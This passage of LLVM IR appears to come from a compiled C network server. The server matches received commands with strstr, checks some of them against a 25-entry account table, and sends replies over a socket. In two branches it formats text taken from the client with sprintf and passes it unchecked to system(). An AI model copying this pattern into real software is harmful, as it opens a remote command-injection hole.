  %1501 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1502 = call i8* @strstr(i8* %1501, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0)) #8
  %1503 = icmp ne i8* %1502, null
  br i1 %1503, label %1508, label %1504

; <label>:1504:                                   ; preds = %1500
  %1505 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1506 = call i8* @strstr(i8* %1505, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i32 0, i32 0)) #8
  %1507 = icmp ne i8* %1506, null
  br i1 %1507, label %1508, label %1550

; <label>:1508:                                   ; preds = %1504, %1500
  %1509 = load i8*, i8** %12, align 8
  %1510 = load i32, i32* %5, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1511
  %1513 = getelementptr inbounds %struct.account, %struct.account* %1512, i32 0, i32 2
  %1514 = getelementptr inbounds [20 x i8], [20 x i8]* %1513, i32 0, i32 0
  %1515 = call i32 @strcmp(i8* %1509, i8* %1514) #8
  %1516 = icmp eq i32 %1515, 0
  br i1 %1516, label %1517, label %1538

; <label>:1517:                                   ; preds = %1508
  %1518 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1519 = call i8* @strtok(i8* %1518, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1519, i8** %102, align 8
  %1520 = load i8*, i8** %102, align 8
  %1521 = getelementptr inbounds i8, i8* %1520, i64 8
  store i8* %1521, i8** %103, align 8
  %1522 = load i8*, i8** %103, align 8
  call void @trim(i8* %1522)
  %1523 = load i8*, i8** %103, align 8
  %1524 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1525 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %1523, i8** %1524)
  %1526 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1527 = load i8*, i8** %103, align 8
  %1528 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1529 = call i32 (i8*, i8*, ...) @sprintf(i8* %1526, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i32 0, i32 0), i8* %1527, i8** %1528) #7
  %1530 = load i32, i32* %4, align 4
  %1531 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1533 = call i64 @strlen(i8* %1532) #8
  %1534 = call i64 @send(i32 %1530, i8* %1531, i64 %1533, i32 16384)
  %1535 = icmp eq i64 %1534, -1
  br i1 %1535, label %1536, label %1537

; <label>:1536:                                   ; preds = %1517
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1537:                                   ; preds = %1517
  br label %1549

; <label>:1538:                                   ; preds = %1508
  %1539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1540 = call i32 (i8*, i8*, ...) @sprintf(i8* %1539, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1541 = load i32, i32* %4, align 4
  %1542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1543 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1544 = call i64 @strlen(i8* %1543) #8
  %1545 = call i64 @send(i32 %1541, i8* %1542, i64 %1544, i32 16384)
  %1546 = icmp eq i64 %1545, -1
  br i1 %1546, label %1547, label %1548

; <label>:1547:                                   ; preds = %1538
  br label %1548

; <label>:1548:                                   ; preds = %1547, %1538
  br label %1549

; <label>:1549:                                   ; preds = %1548, %1537
  br label %1550

; <label>:1550:                                   ; preds = %1549, %1504
  %1551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1552 = call i8* @strstr(i8* %1551, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i32 0, i32 0)) #8
  %1553 = icmp ne i8* %1552, null
  br i1 %1553, label %1558, label %1554

; <label>:1554:                                   ; preds = %1550
  %1555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1556 = call i8* @strstr(i8* %1555, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0)) #8
  %1557 = icmp ne i8* %1556, null
  br i1 %1557, label %1558, label %1615

; <label>:1558:                                   ; preds = %1554, %1550
  %1559 = load i8*, i8** %12, align 8
  %1560 = load i32, i32* %5, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1561
  %1563 = getelementptr inbounds %struct.account, %struct.account* %1562, i32 0, i32 2
  %1564 = getelementptr inbounds [20 x i8], [20 x i8]* %1563, i32 0, i32 0
  %1565 = call i32 @strcmp(i8* %1559, i8* %1564) #8
  %1566 = icmp eq i32 %1565, 0
  br i1 %1566, label %1567, label %1603

; <label>:1567:                                   ; preds = %1558
  %1568 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1569 = call i8* @strtok(i8* %1568, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1569, i8** %104, align 8
  %1570 = load i8*, i8** %104, align 8
  %1571 = getelementptr inbounds i8, i8* %1570, i64 8
  store i8* %1571, i8** %105, align 8
  %1572 = load i8*, i8** %105, align 8
  call void @trim(i8* %1572)
  %1573 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1574 = bitcast i8** %1573 to i8*
  %1575 = load i8*, i8** %105, align 8
  %1576 = call i32 (i8*, i8*, ...) @sprintf(i8* %1574, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i32 0, i32 0), i8* %1575) #7
  %1577 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1578 = bitcast i8** %1577 to i8*
  %1579 = call i32 @system(i8* %1578)
  %1580 = load i32, i32* %5, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1581
  %1583 = getelementptr inbounds %struct.account, %struct.account* %1582, i32 0, i32 0
  %1584 = getelementptr inbounds [20 x i8], [20 x i8]* %1583, i32 0, i32 0
  %1585 = load i8*, i8** %105, align 8
  %1586 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i32 0, i32 0), i8* %1584, i8* %1585)
  %1587 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1588 = load i32, i32* %5, align 4
  %1589 = sext i32 %1588 to i64
  %1590 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1589
  %1591 = getelementptr inbounds %struct.account, %struct.account* %1590, i32 0, i32 0
  %1592 = getelementptr inbounds [20 x i8], [20 x i8]* %1591, i32 0, i32 0
  %1593 = load i8*, i8** %105, align 8
  %1594 = call i32 (i8*, i8*, ...) @sprintf(i8* %1587, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i32 0, i32 0), i8* %1592, i8* %1593) #7
  %1595 = load i32, i32* %4, align 4
  %1596 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1597 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1598 = call i64 @strlen(i8* %1597) #8
  %1599 = call i64 @send(i32 %1595, i8* %1596, i64 %1598, i32 16384)
  %1600 = icmp eq i64 %1599, -1
  br i1 %1600, label %1601, label %1602

; <label>:1601:                                   ; preds = %1567
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1602:                                   ; preds = %1567
  br label %1614

; <label>:1603:                                   ; preds = %1558
  %1604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1605 = call i32 (i8*, i8*, ...) @sprintf(i8* %1604, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1606 = load i32, i32* %4, align 4
  %1607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1608 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1609 = call i64 @strlen(i8* %1608) #8
  %1610 = call i64 @send(i32 %1606, i8* %1607, i64 %1609, i32 16384)
  %1611 = icmp eq i64 %1610, -1
  br i1 %1611, label %1612, label %1613

; <label>:1612:                                   ; preds = %1603
  br label %1613

; <label>:1613:                                   ; preds = %1612, %1603
  br label %1614

; <label>:1614:                                   ; preds = %1613, %1602
  br label %1615

; <label>:1615:                                   ; preds = %1614, %1554
  %1616 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1617 = call i8* @strstr(i8* %1616, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0)) #8
  %1618 = icmp ne i8* %1617, null
  br i1 %1618, label %1619, label %1630

; <label>:1619:                                   ; preds = %1615
  %1620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1621 = call i32 (i8*, i8*, ...) @sprintf(i8* %1620, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i32 0, i32 0)) #7
  %1622 = load i32, i32* %4, align 4
  %1623 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1625 = call i64 @strlen(i8* %1624) #8
  %1626 = call i64 @send(i32 %1622, i8* %1623, i64 %1625, i32 16384)
  %1627 = icmp eq i64 %1626, -1
  br i1 %1627, label %1628, label %1629

; <label>:1628:                                   ; preds = %1619
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1629:                                   ; preds = %1619
  br label %1630

; <label>:1630:                                   ; preds = %1629, %1615
  %1631 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1632 = call i8* @strstr(i8* %1631, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0)) #8
  %1633 = icmp ne i8* %1632, null
  br i1 %1633, label %1634, label %1645

; <label>:1634:                                   ; preds = %1630
  %1635 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1636 = call i32 (i8*, i8*, ...) @sprintf(i8* %1635, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1637 = load i32, i32* %4, align 4
  %1638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1639 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1640 = call i64 @strlen(i8* %1639) #8
  %1641 = call i64 @send(i32 %1637, i8* %1638, i64 %1640, i32 16384)
  %1642 = icmp eq i64 %1641, -1
  br i1 %1642, label %1643, label %1644

; <label>:1643:                                   ; preds = %1634
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1644:                                   ; preds = %1634
  br label %1645

; <label>:1645:                                   ; preds = %1644, %1630
  %1646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1647 = call i8* @strstr(i8* %1646, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i32 0, i32 0)) #8
  %1648 = icmp ne i8* %1647, null
  br i1 %1648, label %1649, label %1660

; <label>:1649:                                   ; preds = %1645
  %1650 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1651 = call i32 (i8*, i8*, ...) @sprintf(i8* %1650, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1652 = load i32, i32* %4, align 4
  %1653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1654 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1655 = call i64 @strlen(i8* %1654) #8
  %1656 = call i64 @send(i32 %1652, i8* %1653, i64 %1655, i32 16384)
  %1657 = icmp eq i64 %1656, -1
  br i1 %1657, label %1658, label %1659

; <label>:1658:                                   ; preds = %1649
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1659:                                   ; preds = %1649
  br label %1660

; <label>:1660:                                   ; preds = %1659, %1645
  %1661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1662 = call i8* @strstr(i8* %1661, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i32 0, i32 0)) #8
  %1663 = icmp ne i8* %1662, null
  br i1 %1663, label %1664, label %1675

; <label>:1664:                                   ; preds = %1660
  %1665 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1666 = call i32 (i8*, i8*, ...) @sprintf(i8* %1665, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1667 = load i32, i32* %4, align 4
  %1668 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1669 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1670 = call i64 @strlen(i8* %1669) #8
  %1671 = call i64 @send(i32 %1667, i8* %1668, i64 %1670, i32 16384)
  %1672 = icmp eq i64 %1671, -1
  br i1 %1672, label %1673, label %1674

; <label>:1673:                                   ; preds = %1664
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1674:                                   ; preds = %1664
  br label %1675

; <label>:1675:                                   ; preds = %1674, %1660
  %1676 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1677 = call i8* @strstr(i8* %1676, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i32 0, i32 0)) #8
  %1678 = icmp ne i8* %1677, null
  br i1 %1678, label %1679, label %1690

; <label>:1679:                                   ; preds = %1675
  %1680 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1681 = call i32 (i8*, i8*, ...) @sprintf(i8* %1680, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i32 0, i32 0)) #7
  %1682 = load i32, i32* %4, align 4
  %1683 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1684 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1685 = call i64 @strlen(i8* %1684) #8
  %1686 = call i64 @send(i32 %1682, i8* %1683, i64 %1685, i32 16384)
  %1687 = icmp eq i64 %1686, -1
  br i1 %1687, label %1688, label %1689

; <label>:1688:                                   ; preds = %1679
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1689:                                   ; preds = %1679
  br label %1690

; <label>:1690:                                   ; preds = %1689, %1675
  %1691 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1692 = call i8* @strstr(i8* %1691, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0)) #8
  %1693 = icmp ne i8* %1692, null
  br i1 %1693, label %1694, label %1705

; <label>:1694:                                   ; preds = %1690
  %1695 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1696 = call i32 (i8*, i8*, ...) @sprintf(i8* %1695, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i32 0, i32 0)) #7
  %1697 = load i32, i32* %4, align 4
  %1698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1699 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1700 = call i64 @strlen(i8* %1699) #8
  %1701 = call i64 @send(i32 %1697, i8* %1698, i64 %1700, i32 16384)
  %1702 = icmp eq i64 %1701, -1
  br i1 %1702, label %1703, label %1704

; <label>:1703:                                   ; preds = %1694
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1704:                                   ; preds = %1694
  br label %1705

; <label>:1705:                                   ; preds = %1704, %1690
  %1706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1707 = call i8* @strstr(i8* %1706, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i32 0, i32 0)) #8
  %1708 = icmp ne i8* %1707, null
  br i1 %1708, label %1709, label %1720

; <label>:1709:                                   ; preds = %1705
  %1710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1711 = call i32 (i8*, i8*, ...) @sprintf(i8* %1710, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i32 0, i32 0)) #7
  %1712 = load i32, i32* %4, align 4
  %1713 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1715 = call i64 @strlen(i8* %1714) #8
  %1716 = call i64 @send(i32 %1712, i8* %1713, i64 %1715, i32 16384)
  %1717 = icmp eq i64 %1716, -1
  br i1 %1717, label %1718, label %1719

; <label>:1718:                                   ; preds = %1709
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1719:                                   ; preds = %1709
  br label %1720

; <label>:1720:                                   ; preds = %1719, %1705
  %1721 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1722 = call i8* @strstr(i8* %1721, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #8
  %1723 = icmp ne i8* %1722, null
  br i1 %1723, label %1724, label %1735

; <label>:1724:                                   ; preds = %1720
  %1725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1726 = call i32 (i8*, i8*, ...) @sprintf(i8* %1725, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i32 0, i32 0)) #7
  %1727 = load i32, i32* %4, align 4
  %1728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1729 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1730 = call i64 @strlen(i8* %1729) #8
  %1731 = call i64 @send(i32 %1727, i8* %1728, i64 %1730, i32 16384)
  %1732 = icmp eq i64 %1731, -1
  br i1 %1732, label %1733, label %1734

; <label>:1733:                                   ; preds = %1724
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1734:                                   ; preds = %1724
  br label %1735

; <label>:1735:                                   ; preds = %1734, %1720
  %1736 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1737 = call i8* @strstr(i8* %1736, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i32 0, i32 0)) #8
  %1738 = icmp ne i8* %1737, null
  br i1 %1738, label %1739, label %1750

; <label>:1739:                                   ; preds = %1735
  %1740 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1741 = call i32 (i8*, i8*, ...) @sprintf(i8* %1740, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i32 0, i32 0)) #7
  %1742 = load i32, i32* %4, align 4
  %1743 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1744 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1745 = call i64 @strlen(i8* %1744) #8
  %1746 = call i64 @send(i32 %1742, i8* %1743, i64 %1745, i32 16384)
  %1747 = icmp eq i64 %1746, -1
  br i1 %1747, label %1748, label %1749

; <label>:1748:                                   ; preds = %1739
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1749:                                   ; preds = %1739
  br label %1750

; <label>:1750:                                   ; preds = %1749, %1735
  %1751 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1752 = call i8* @strstr(i8* %1751, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i32 0, i32 0)) #8
  %1753 = icmp ne i8* %1752, null
  br i1 %1753, label %1754, label %1765

; <label>:1754:                                   ; preds = %1750
  %1755 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1756 = call i32 (i8*, i8*, ...) @sprintf(i8* %1755, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i32 0, i32 0)) #7
  %1757 = load i32, i32* %4, align 4
  %1758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1759 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1760 = call i64 @strlen(i8* %1759) #8
  %1761 = call i64 @send(i32 %1757, i8* %1758, i64 %1760, i32 16384)
  %1762 = icmp eq i64 %1761, -1
  br i1 %1762, label %1763, label %1764

; <label>:1763:                                   ; preds = %1754
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1764:                                   ; preds = %1754
  br label %1765

; <label>:1765:                                   ; preds = %1764, %1750
  %1766 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1767 = call i8* @strstr(i8* %1766, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i32 0, i32 0)) #8
  %1768 = icmp ne i8* %1767, null
  br i1 %1768, label %1769, label %1780

; <label>:1769:                                   ; preds = %1765
  %1770 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1771 = call i32 (i8*, i8*, ...) @sprintf(i8* %1770, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i32 0, i32 0)) #7
  %1772 = load i32, i32* %4, align 4
  %1773 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1774 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1775 = call i64 @strlen(i8* %1774) #8
  %1776 = call i64 @send(i32 %1772, i8* %1773, i64 %1775, i32 16384)
  %1777 = icmp eq i64 %1776, -1
  br i1 %1777, label %1778, label %1779

; <label>:1778:                                   ; preds = %1769
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1779:                                   ; preds = %1769
  br label %1780

; <label>:1780:                                   ; preds = %1779, %1765
  %1781 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1782 = call i8* @strstr(i8* %1781, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i32 0, i32 0)) #8
  %1783 = icmp ne i8* %1782, null
  br i1 %1783, label %1784, label %1795

; <label>:1784:                                   ; preds = %1780
  %1785 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1786 = call i32 (i8*, i8*, ...) @sprintf(i8* %1785, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i32 0, i32 0)) #7
  %1787 = load i32, i32* %4, align 4
  %1788 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1789 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1790 = call i64 @strlen(i8* %1789) #8
  %1791 = call i64 @send(i32 %1787, i8* %1788, i64 %1790, i32 16384)
  %1792 = icmp eq i64 %1791, -1
  br i1 %1792, label %1793, label %1794

; <label>:1793:                                   ; preds = %1784
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1794:                                   ; preds = %1784
  br label %1795

; <label>:1795:                                   ; preds = %1794, %1780
  %1796 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1797 = call i8* @strstr(i8* %1796, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i32 0, i32 0)) #8
  %1798 = icmp ne i8* %1797, null
  br i1 %1798, label %1799, label %1810

; <label>:1799:                                   ; preds = %1795
  %1800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1801 = call i32 (i8*, i8*, ...) @sprintf(i8* %1800, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i32 0, i32 0)) #7
  %1802 = load i32, i32* %4, align 4
  %1803 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1804 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1805 = call i64 @strlen(i8* %1804) #8
  %1806 = call i64 @send(i32 %1802, i8* %1803, i64 %1805, i32 16384)
  %1807 = icmp eq i64 %1806, -1
  br i1 %1807, label %1808, label %1809

; <label>:1808:                                   ; preds = %1799
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1809:                                   ; preds = %1799
  br label %1810

; <label>:1810:                                   ; preds = %1809, %1795
  %1811 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1812 = call i8* @strstr(i8* %1811, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0)) #8
  %1813 = icmp ne i8* %1812, null
  br i1 %1813, label %1814, label %1825

; <label>:1814:                                   ; preds = %1810
  %1815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1816 = call i32 (i8*, i8*, ...) @sprintf(i8* %1815, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i32 0, i32 0)) #7
  %1817 = load i32, i32* %4, align 4
  %1818 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1819 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1820 = call i64 @strlen(i8* %1819) #8
  %1821 = call i64 @send(i32 %1817, i8* %1818, i64 %1820, i32 16384)
  %1822 = icmp eq i64 %1821, -1
  br i1 %1822, label %1823, label %1824

; <label>:1823:                                   ; preds = %1814
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1824:                                   ; preds = %1814
  br label %1825

; <label>:1825:                                   ; preds = %1824, %1810
  %1826 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1827 = call i8* @strstr(i8* %1826, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0)) #8
  %1828 = icmp ne i8* %1827, null
  br i1 %1828, label %1829, label %1840

; <label>:1829:                                   ; preds = %1825
  %1830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1831 = call i32 (i8*, i8*, ...) @sprintf(i8* %1830, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i32 0, i32 0)) #7
  %1832 = load i32, i32* %4, align 4
  %1833 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1834 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1835 = call i64 @strlen(i8* %1834) #8
  %1836 = call i64 @send(i32 %1832, i8* %1833, i64 %1835, i32 16384)
  %1837 = icmp eq i64 %1836, -1
  br i1 %1837, label %1838, label %1839

; <label>:1838:                                   ; preds = %1829
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1839:                                   ; preds = %1829
  br label %1840

; <label>:1840:                                   ; preds = %1839, %1825
  %1841 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1842 = call i8* @strstr(i8* %1841, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i32 0, i32 0)) #8
  %1843 = icmp ne i8* %1842, null
  br i1 %1843, label %1848, label %1844

; <label>:1844:                                   ; preds = %1840
  %1845 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1846 = call i8* @strstr(i8* %1845, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i32 0, i32 0)) #8
  %1847 = icmp ne i8* %1846, null
  br i1 %1847, label %1848, label %1875

; <label>:1848:                                   ; preds = %1844, %1840
  %1849 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %1850 = bitcast i8** %1849 to i8*
  %1851 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1852 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1853 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1854 = call i32 (i8*, i8*, ...) @sprintf(i8* %1850, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i32 0, i32 0), i8** %1851, i8** %1852, i8** %1853) #7
  %1855 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %1856 = bitcast i8** %1855 to i8*
  %1857 = call i32 @system(i8* %1856)
  %1858 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1859 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1860 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1861 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %1858, i8** %1859, i8** %1860)
  %1862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1863 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1864 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1865 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1866 = call i32 (i8*, i8*, ...) @sprintf(i8* %1862, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %1863, i8** %1864, i8** %1865) #7
  %1867 = load i32, i32* %4, align 4
